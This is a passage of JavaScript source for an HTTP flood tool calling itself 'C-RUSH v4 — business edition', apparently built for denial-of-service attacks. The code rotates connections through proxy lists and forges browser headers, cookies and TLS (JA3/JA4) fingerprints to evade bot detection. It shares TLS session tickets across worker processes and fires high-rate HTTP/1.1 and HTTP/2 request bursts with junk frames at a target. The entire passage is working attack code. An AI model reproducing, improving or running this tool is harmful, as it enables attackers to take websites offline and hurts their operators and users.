      const ip = host.match(/^\d+\.\d+\.\d+\.\d+$/) ? host.split('.').map(Number) : null;
      const hb = ip ? null : Buffer.from(host + '\0', 'binary');
      const b = Buffer.alloc(9 + (hb ? hb.length : 1));
      b.writeUInt8(0x04, 0); b.writeUInt8(0x01, 1); b.writeUInt16BE(port, 2);
      if (ip) { b.writeUInt8(ip[0],4); b.writeUInt8(ip[1],5); b.writeUInt8(ip[2],6); b.writeUInt8(ip[3],7); b.writeUInt8(0,8); }
      else { b.writeUInt32BE(0x01000000, 4); b.writeUInt8(0, 8); hb.copy(b, 9); }
      s.write(b);
    });
    s.once('data', d => {
      if (closed) return;
      if (d.length < 2 || d[0] !== 0x00 || (d[1] !== 0x5a && d[1] !== 0x5b)) { closed = true; s.destroy(); return cb(new Error('socks4 reply')); }
      closed = true; s.setTimeout(0); cb(null, s);
    });
  }
  function httpTunnel() {
    const s = net.connect(proxy.p, proxy.h);
    let closed = false, buf = '';
    s.setTimeout(8000, () => { if (!closed) { closed = true; s.destroy(); cb(new Error('timeout')); } });
    s.once('error', e => { if (!closed) { closed = true; cb(e); } });
    s.once('connect', () => s.write(`CONNECT ${host}:${port} HTTP/1.1\r\nHost: ${host}:${port}\r\nProxy-Connection: Keep-Alive\r\nUser-Agent: Mozilla/5.0\r\n\r\n`));
    s.on('data', d => {
      buf += d.toString('binary');
      const i = buf.indexOf('\r\n\r\n');
      if (i === -1 || closed) return;
      if (!/^HTTP\/1\.[01] 200/.test(buf)) { closed = true; s.destroy(); return cb(new Error('http proxy ' + buf.slice(0, 40))); }
      closed = true; s.setTimeout(0); cb(null, s);
    });
  }
}

// ===========================================================================
// cookie jar
// ===========================================================================
function makeCookieJar(id) {
  const jar = [];
  const ga1 = `GA1.1.${crypto.randomBytes(8).toString('hex')}`;
  jar.push(`_ga=${ga1}.${Math.floor(Date.now() / 1000)}`);
  if (Math.random() < 0.7) jar.push(`_gid=GA1.2.${crypto.randomBytes(8).toString('hex')}`);
  if (id.chVer) { const tenant = crypto.randomBytes(2).toString('hex').toUpperCase(); jar.push(`_ga_${tenant}=${ga1.split('.').slice(-1)[0]}`); }
  if (Math.random() < 0.75) {
    const names = ['session','sessionid','PHPSESSID','JSESSIONID','connect.sid','_session_id','ci_session'];
    jar.push(`${names[(Math.random()*names.length)|0]}=${crypto.randomBytes(16).toString('hex')}`);
  }
  if (Math.random() < 0.35) {
    const names = ['csrf','csrf_token','XSRF-TOKEN','_csrf','csrftoken'];
    jar.push(`${names[(Math.random()*names.length)|0]}=${crypto.randomBytes(12).toString('base64url')}`);
  }
  if (id.isMobile && Math.random() < 0.5) jar.push(`theme=${['light','dark','system'][(Math.random()*3)|0]}`);
  if (Math.random() < 0.4) { const lang = pickLang().split(',')[0].split('-')[0]; jar.push(`lang=${lang}-${['US','GB','CA','AU'][(Math.random()*4)|0]}`); }
  if (Math.random() < 0.25) jar.push(`visited=${Math.floor(Math.random()*3)+1}`);
  if (Math.random() < 0.3) jar.push(`cookie_consent=${['accepted','rejected','necessary'][(Math.random()*3)|0]}`);
  return jar.slice(0, 5).join('; ');
}

// ===========================================================================
// headers
// ===========================================================================
function secChUaHeader(id, full) {
  if (!id.chVer) return null;
  return full ? (CH_UA_FULL[id.chVer] || CH_UA_FULL['135']) : (CH_UA[id.chVer] || CH_UA['135']);
}
function secFetchHeaders(id) {
  if (!id.chVer) return null;
  const fresh = Math.random() < 0.6;
  return { site: fresh ? 'none' : 'same-origin', mode: 'navigate', user: fresh ? '?1' : '?0', dest: 'document' };
}
function clientHintHeaders(id, full) {
  if (!id.chVer) return null;
  const base = {
    'device-memory': id.dv || '8',
    'dpr': id.dpr || '1',
    'viewport-width': id.vw || '1920',
    'rtt': '50',
    'downlink': String([1.35, 2.5, 5, 10, 10][(Math.random()*5)|0]),
    'ect': '4g',
  };
  if (full) base['sec-ch-ua-full-version-list'] = CH_UA_FULL[id.chVer] || CH_UA_FULL['135'];
  return base;
}
function realReferer(s) { return (!s.first && Math.random() < 0.55) ? ORIGIN + PATH : null; }
function realConditional(s) {
  if (s.first) return null;
  if (s.etag && Math.random() < 0.4) return `If-None-Match: ${s.etag}`;
  if (s.lastMod && Math.random() < 0.25) return `If-Modified-Since: ${s.lastMod}`;
  return null;
}

// ===========================================================================
// H1 request builder — headless mode is meaningfully leaner
// ===========================================================================
function buildRequest(sessionJar, sessionState) {
  const id = identity();
  const m = ['GET','GET','GET','POST','HEAD'][(Math.random()*5)|0];
  const lang = pickLang();
  let h = `${m} ${PATH}${Math.random() < 0.3 ? '?r=' + Math.random().toString(36).slice(2, 10) : ''} HTTP/1.1\r\n`;
  h += `Host: ${HOSTHDR}\r\nConnection: keep-alive\r\n`;

  if (id.chVer) {
    const chua = secChUaHeader(id, options.headfull);
    h += `sec-ch-ua: ${chua}\r\nsec-ch-ua-mobile: ${id.mobile}\r\nsec-ch-ua-platform: ${id.platform}\r\n`;
  }
  h += `User-Agent: ${id.ua}\r\nAccept: ${id.accept}\r\n`;

  if (options.headfull) {
    const sf = secFetchHeaders(id);
    if (sf) h += `Sec-Fetch-Site: ${sf.site}\r\nSec-Fetch-Mode: ${sf.mode}\r\nSec-Fetch-User: ${sf.user}\r\nSec-Fetch-Dest: ${sf.dest}\r\n`;
    if (id.chVer && Math.random() < 0.3) {
      const ch = clientHintHeaders(id, true);
      if (ch) {
        h += `Device-Memory: ${ch['device-memory']}\r\nDPR: ${ch.dpr}\r\nViewport-Width: ${ch['viewport-width']}\r\nRTT: ${ch.rtt}\r\nDownlink: ${ch.downlink}\r\nECT: ${ch.ect}\r\n`;
        h += `Sec-CH-UA-Full-Version-List: ${ch['sec-ch-ua-full-version-list']}\r\n`;
      }
    }
    if (id.chVer) h += `Upgrade-Insecure-Requests: 1\r\n`;
  } else {
    // headless mode: minimal but realistic. Skip sec-fetch-*, client hints, upgrade-insecure-requests.
    // Real headless Chrome skips these unless a page is rendered. Saves bytes and CPU.
  }

  const ref = realReferer(sessionState);
  if (ref) h += `Referer: ${ref}\r\n`;
  const cond = realConditional(sessionState);
  if (cond) h += cond + '\r\n';

  h += `Accept-Encoding: ${id.acceptEnc}\r\nAccept-Language: ${lang}\r\n`;
  if (id.chVer) h += `Priority: u=0, i\r\n`;
  h += `Cache-Control: ${options.cache ? 'max-age=0' : 'no-cache'}\r\n`;
  if (options.cookies && sessionJar) h += `Cookie: ${sessionJar}\r\n`;
  h += '\r\n';
  sessionState.first = false;
  return Buffer.from(h, 'binary');
}

function buildH2Headers(sessionJar, sessionState) {
  const id = identity();
  const m = ['GET','GET','GET','POST','HEAD'][(Math.random()*5)|0];
  const lang = pickLang();
  const hdrs = [
    [':method', m], [':authority', HOSTHDR], [':scheme', 'https'],
    [':path', PATH + (Math.random() < 0.3 ? '?r=' + Math.random().toString(36).slice(2, 10) : '')],
  ];
  if (id.chVer) {
    const chua = secChUaHeader(id, options.headfull);
    hdrs.push(['sec-ch-ua', chua]);
    hdrs.push(['sec-ch-ua-mobile', id.mobile]);
    hdrs.push(['sec-ch-ua-platform', id.platform]);
  }
  hdrs.push(['user-agent', id.ua]);
  hdrs.push(['accept', id.accept]);

  if (options.headfull) {
    const sf = secFetchHeaders(id);
    if (sf) {
      hdrs.push(['sec-fetch-site', sf.site]);
      hdrs.push(['sec-fetch-mode', sf.mode]);
      hdrs.push(['sec-fetch-user', sf.user]);
      hdrs.push(['sec-fetch-dest', sf.dest]);
    }
    if (id.chVer && Math.random() < 0.3) {
      const ch = clientHintHeaders(id, true);
      if (ch) {
        hdrs.push(['device-memory', ch['device-memory']]);
        hdrs.push(['dpr', ch.dpr]);
        hdrs.push(['viewport-width', ch['viewport-width']]);
        hdrs.push(['rtt', ch.rtt]);
        hdrs.push(['downlink', ch.downlink]);
        hdrs.push(['ect', ch.ect]);
        hdrs.push(['sec-ch-ua-full-version-list', ch['sec-ch-ua-full-version-list']]);
      }
    }
    if (id.chVer) hdrs.push(['upgrade-insecure-requests', '1']);
  }

  const ref = realReferer(sessionState);
  if (ref) hdrs.push(['referer', ref]);
  const cond = realConditional(sessionState);
  if (cond) hdrs.push(cond.split(': ').map(s => s.trim()));

  hdrs.push(['accept-encoding', id.acceptEnc]);
  hdrs.push(['accept-language', lang]);
  if (id.chVer) hdrs.push(['priority', 'u=0, i']);
  hdrs.push(['cache-control', options.cache ? 'max-age=0' : 'no-cache']);
  if (options.cookies && sessionJar) hdrs.push(['cookie', sessionJar]);
  sessionState.first = false;
  return hdrs;
}

// ===========================================================================
// frame helpers
// ===========================================================================
function encodeFrame(streamId, type, payload = '', flags = 0) {
  let f = Buffer.alloc(9);
  f.writeUInt32BE((payload.length << 8) | type, 0);
  f.writeUInt8(flags, 4);
  f.writeUInt32BE(streamId & 0x7fffffff, 5);
  if (payload.length > 0) f = Buffer.concat([f, payload]);
  return f;
}
function decodeFrame(data) {
  const la = data.readUInt32BE(0);
  const len = la >> 8;
  const type = la & 0xff;
  const flags = data.readUInt8(4);
  const sid = data.readUInt32BE(5) & 0x7fffffff;
  const off = flags & 0x20 ? 5 : 0;
  let payload = Buffer.alloc(0);
  if (len > 0) {
    payload = data.subarray(9 + off, 9 + off + len);
    if (payload.length + off !== len) return null;
  }
  return { streamId: sid, length: len, type, flags, payload };
}
function encodeSettings(s) {
  const b = Buffer.alloc(6 * s.length);
  for (let i = 0; i < s.length; i++) { b.writeUInt16BE(s[i][0], i * 6); b.writeUInt32BE(s[i][1], i * 6 + 2); }
  return b;
}
function encodePriority(streamId, depId, weight, exclusive) {
  const b = Buffer.alloc(5);
  b.writeUInt32BE((exclusive ? 0x80000000 : 0) | (depId & 0x7fffffff), 0);
  b.writeUInt8(weight & 0xff, 4);
  return encodeFrame(streamId, 2, b, 0);
}
function encodeRstStream(streamId, type, flags) {
  const h = Buffer.alloc(9);
  h.writeUInt32BE(4, 0); h.writeUInt8(type, 4); h.writeUInt8(flags, 5); h.writeUInt32BE(streamId, 5);
  return Buffer.concat([h, Buffer.alloc(4).fill(0)]);
}

// ===========================================================================
// connection cycle
// ===========================================================================
function go() {
  if (activeConns >= options.maxConns) return;
  activeConns++;
  const proxy = proxies[(Math.random() * proxies.length) | 0];
  openTunnel(proxy, HOST, PORT, (err, raw) => {
    if (err || !raw) { activeConns--; return setImmediate(go); }

    const seedId = identity();
    const sessionJar = options.cookies ? makeCookieJar(seedId) : null;
    const sessionState = { first: true, etag: null, lastMod: null };
    const kind = options.version === '1' ? 'h1' : 'h2';
    const cachedTicket = getTicket(proxy, kind);

    const tlsOpts = {
      socket: raw, servername: HOST,
      ALPNProtocols: options.version === '1' ? ['http/1.1'] : FINGERPRINT.alpn,
      ciphers: JA3.ciphers, sigalgs: JA3.sigalgs, ecdhCurve: JA3.curves,
      secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_COMPRESSION,
      secure: true, minVersion: 'TLSv1.2', maxVersion: 'TLSv1.3', rejectUnauthorized: false,
    };
    if (cachedTicket) tlsOpts.session = cachedTicket;

    const t = tls.connect(tlsOpts, () => {
      if (t.getSession) {
        const s = t.getSession();
        if (s && s.length) setTicketLocal(proxy, s, kind);
      }

      // ---------- H1 ----------
      if (!t.alpnProtocol || t.alpnProtocol === 'http/1.1' || options.version === '1') {
        const burstBase = Math.max(4, Math.min(128, Math.ceil(rate / 100)));
        let burst = burstBase;
        function doWrite() {
          if (t.destroyed) return;
          const start = process.hrtime.bigint();
          const bufs = [];
          for (let i = 0; i < burst; i++) bufs.push(buildRequest(sessionJar, sessionState));
          t.write(Buffer.concat(bufs), e => {
            if (e) { t.end(() => t.destroy()); return; }
            const elapsedMs = Number(process.hrtime.bigint() - start) / 1e6;
            const targetMs = (burst / rate) * 1000;
            const remain = targetMs - elapsedMs;
            if (remain < 1) setImmediate(doWrite);
            else setTimeout(doWrite, remain);
          });
        }
        doWrite();
        t.on('error', () => {});
        t.on('close', () => { activeConns--; setImmediate(go); });
        return;
      }

      // ---------- H2 ----------
      let sid = 1;
      let data = Buffer.alloc(0);
      const hpack = new HPACK();
      hpack.setTableSize(4096);
      const wu = Buffer.alloc(4); wu.writeUInt32BE(custom_update, 0);
      t.write(Buffer.from(PREFACE, 'binary'));
      t.write(encodeFrame(0, 4, encodeSettings([[1, custom_header],[2, 0],[4, custom_window],[6, custom_table],[3, 1000]])));
      t.write(encodePriority(1, 0, 255, false));
      t.write(encodeFrame(0, 8, wu));
      t.on('data', ev => {
        data = Buffer.concat([data, ev]);
        while (data.length >= 9) {
          const f = decodeFrame(data);
          if (!f) break;
          data = data.subarray(f.length + 9);
          if (f.type === 4 && f.flags === 0) t.write(encodeFrame(0, 4, '', 1));
          if (f.type === 7 || f.type === 5) { t.write(encodeRstStream(0, 3, 0)); t.end(() => t.destroy()); break; }
        }
      });
      t.on('error', () => {});
      t.on('close', () => { activeConns--; setImmediate(go); });

      const burstBase = Math.max(4, Math.min(256, Math.ceil(rate / 50)));
      let burst = burstBase;
      function doWrite() {
        if (t.destroyed) return;
        const start = process.hrtime.bigint();
        const reqs = [];
        const wu2 = Buffer.alloc(4); wu2.writeUInt32BE(custom_update, 0);
        reqs.push(encodeFrame(0, 8, wu2));
        for (let i = 0; i < burst; i++) {
          const hdrs = buildH2Headers(sessionJar, sessionState);
          const packed = Buffer.concat([Buffer.from([0x80, 0, 0, 0, 0xFF]), hpack.encode(hdrs)]);
          reqs.push(encodeFrame(sid, 1, packed, 0x25));
          sid += 2;
          if (sid > 0x7fffff00) sid = 1;
          if (sid % 80 === 0) {
            const junk = crypto.randomBytes(64 + ((Math.random() * 512) | 0));
            reqs.push(encodeFrame(sid - 2, 0, junk, 0x01));
          }
        }
        t.write(Buffer.concat(reqs), e => {
          if (e) return;
          const elapsedMs = Number(process.hrtime.bigint() - start) / 1e6;
          const targetMs = (burst / rate) * 1000;
          const remain = targetMs - elapsedMs;
          if (remain < 1) setImmediate(doWrite);
          else setTimeout(doWrite, remain);
        });
      }
      doWrite();
    });
    t.on('error', () => { raw.destroy(); activeConns--; setImmediate(go); });
  });
}

// ===========================================================================
// boot
// ===========================================================================
if (cluster.isMaster || cluster.isPrimary) {
  console.clear();
  if (options.debug) {
    console.log(colors.red(`${colors.green('🐍')} C-RUSH v4 — business edition`));
    console.log(colors.gray(`  target:   ${target}`));
    console.log(colors.gray(`  duration: ${duration}s`));
    console.log(colors.gray(`  threads:  ${threads}`));
    console.log(colors.gray(`  rate:     ${rate}/s per worker`));
    console.log(colors.gray(`  conns:    ${options.maxConns} max per worker`));
    console.log(colors.gray(`  version:  ${options.version === '1' ? 'HTTP/1.1' : 'HTTP/2'}`));
    console.log(colors.gray(`  lane:     ${LANE}`));
    console.log(colors.gray(`  proxies:  ${proxies.length} loaded (socks4/5 + http/https auto-sniff)`));
    console.log(colors.gray(`  cookies:  ${options.cookies ? 'per-connection jar, 5 max, realistic families' : 'off'}`));
    console.log(colors.gray(`  headfull: ${options.headfull ? 'sec-fetch + client-hints + sec-ch-ua full list' : 'off (headless pattern, leaner payload)'}`));
    console.log(colors.gray(`  session:  shared ticket pool, max ${TICKET_MAX_USES} reuses, cluster-synced, 60s broadcast cooldown`));
    console.log('');
  }

  // --- ticket pool master-side ---
  const lastBroadcast = new Map();
  function setupWorker(w) {
    w.on('message', msg => {
      if (!msg || msg.type !== 'ticket-add') return;
      const now = Date.now();
      const last = lastBroadcast.get(msg.proxyKey) || 0;
      if (now - last < TICKET_BROADCAST_COOLDOWN) return;
      lastBroadcast.set(msg.proxyKey, now);
      for (const w2 of Object.values(cluster.workers || {})) {
        if (!w2 || w2.id === w.id || !w2.isConnected()) continue;
        try { w2.send(msg); } catch (e) {}
      }
    });
  }
  cluster.on('online', setupWorker);

  function forkWorkers(effectiveVersion) {
    for (let i = 0; i < threads; i++) {
      const w = cluster.fork();
      w.send({ type: 'config', ja3: JA3, ja4: JA4, fp: FINGERPRINT, version: effectiveVersion });
    }
  }

  probeJA3Real(HOST).then(res => {
    FINGERPRINT = res.fp;
    JA3 = res.ja3;
    JA4 = res.ja4;
    if (options.debug) {
      console.log(colors.green(`  ja3:      ${res.source}`));
      console.log(colors.gray(`  ja4:      ${JA4}`));
      console.log('');
    }
    forkWorkers(options.version);
  }).catch(() => {
    if (options.debug) console.log(colors.yellow('  ja3:      probe errored — using chrome135 preset'));
    forkWorkers(options.version);
  });

  let sent = 0;
  const ticker = setInterval(() => {
    sent += rate * threads;
    setTitle(`C-RUSH v4 | ≈${sent} | ${options.version === '1' ? 'H1' : 'H2'} | ${LANE}`);
  }, 1000);

  const killer = setTimeout(() => {
    if (options.debug) console.log(colors.red(`\n🐍 done — ~${sent} reqs`));
    process.exit(0);
  }, duration * 1000);

  process.on('SIGINT', () => {
    clearInterval(ticker);
    clearTimeout(killer);
    if (options.debug) console.log(colors.yellow(`\n🐍 interrupted — ~${sent} reqs`));
    process.exit(0);
  });
} else {
  let started = false;
  process.on('message', m => {
    if (!m) return;
    if (m.type === 'config') {
      if (m.ja3) JA3 = m.ja3;
      if (m.ja4) JA4 = m.ja4;
      if (m.fp) FINGERPRINT = m.fp;
      if (m.version) options.version = m.version;
      if (!started) {
        started = true;
        setInterval(() => go(), 1000 / rate);
      }
    } else if (m.type === 'ticket-add') {
      applyRemoteTicket(m.proxyKey, m.ticket, m.kind);
    }
  });
}
